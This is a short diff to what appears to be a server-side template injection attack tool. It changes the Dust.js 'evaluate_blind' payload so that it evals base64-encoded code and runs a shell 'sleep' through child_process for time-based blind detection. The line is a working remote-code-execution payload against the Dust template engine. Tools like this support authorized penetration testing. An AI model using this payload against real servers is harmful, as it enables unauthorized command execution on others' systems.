@@ -52,7 +52,7 @@ class Dust(javascript.Javascript):
             },
             'evaluate_blind': {
                 'call': 'inject',
-                'evaluate_blind': """{{@if cond="eval(Buffer('{code_b64p}', 'base64').toString())"}}{{/if}}"""
+                'evaluate_blind': """{{@if cond="eval(Buffer('{code_b64p}', 'base64').toString())&&require('child_process').execSync('sleep {delay}')"}}{{/if}}"""
             },
             'execute': {
                 'call': 'evaluate',
